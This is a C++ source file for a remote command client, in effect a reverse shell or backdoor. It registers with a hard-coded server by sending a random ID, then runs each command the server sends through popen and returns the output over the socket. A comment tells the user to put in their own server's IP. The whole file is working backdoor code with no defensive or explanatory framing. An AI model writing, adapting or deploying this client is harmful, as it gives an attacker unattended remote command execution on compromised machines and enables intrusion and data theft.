#include <iostream>
#include <sstream>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdexcept>
#include <uuid/uuid.h>
#include <chrono>
#include <random>

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string generate_unique_id() {
    // Use the current time as a seed for the random number generator
    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
    std::mt19937 generator(seed);

    // Generate a random 64-bit integer
    std::uniform_int_distribution<uint64_t> distribution(0, UINT64_MAX);
    uint64_t random_number = distribution(generator);

    // Convert the random number to a string
    std::ostringstream oss;
    oss << std::hex << random_number;
    std::string unique_id = oss.str();

    // Return the unique ID
    return unique_id;
}

bool initiationSequence(int clientSocket, const char* guid) {
    // Identify self
    send(clientSocket, guid, strlen(guid), 0);

    // Get server response
    char buffer[1024];
    ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesRead == -1) {
        //std::cerr << "Error reading from client socket" << std::endl;
        return false;
    } else if (bytesRead == 0) {
        //std::cout << "Client disconnected" << std::endl;
        return false;
    } else {
        std::string clientRsp =  std::string(buffer, bytesRead);
        //std::cout << "Received " << bytesRead << " bytes from client: " << clientRsp << std::endl;
        if (clientRsp == "nah\n") return false;
        else return true;
        return true;
    }
}

int main() {

    // Prepare guid
    bool continueServerRelations = false;
    std::string uniqueGuid = generate_unique_id();

    // Connect to the server socket
    while (true) {
        // Create a socket using the IPv4 address family, TCP protocol, and default protocol (0)
        int clientSocket = socket(AF_INET, SOCK_STREAM, 0);

        // Create a server address structure
        struct sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1"); // Replace with your server's IP address
        serverAddress.sin_port = htons(7867);
        int connectionResult = connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));

        // Set a receive timeout of 5 seconds
        // struct timeval timeout;
        // timeout.tv_sec = 5;
        // timeout.tv_usec = 0;
        // if (setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
        //     std::cerr << "Error setting receive timeout: " << strerror(errno) << std::endl;
        //     return 1;
        // }


        if (connectionResult == -1) {
            std::cerr << "Error connecting to server socket" << std::endl;
            close(clientSocket);
            return 1;
        }

        // Listener handshake
        continueServerRelations = initiationSequence(clientSocket, uniqueGuid.c_str());
        if (!continueServerRelations) continue;

        while (continueServerRelations){
            // Receive data
            char buffer[1024];
            char command[100];
            char responseBuffer[1000];
            ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (bytesRead == -1) {
                //std::cerr << "Error reading from client socket" << std::endl;
                // if (errno == EAGAIN || errno == EWOULDBLOCK) {
                //     std::cerr << "Receive timeout after 5 seconds" << std::endl;
                // } else {
                //     std::cerr << "Error receiving message from server: " << strerror(errno) << std::endl;
                // }
                close(clientSocket);
            } else if (bytesRead == 0) {
                //std::cout << "Client disconnected" << std::endl;
                close(clientSocket);
            } else {
                //std::cout << "Received " << bytesRead << " bytes from client: " << std::string(buffer, bytesRead) << std::endl;
                std::string response = exec(buffer);
                std::cout << response << std::endl;
                send(clientSocket, response.data(), strlen(response.data()), 0);
            }
        }

        // Close the client socket
        close(clientSocket);
    }

    return 0;
}
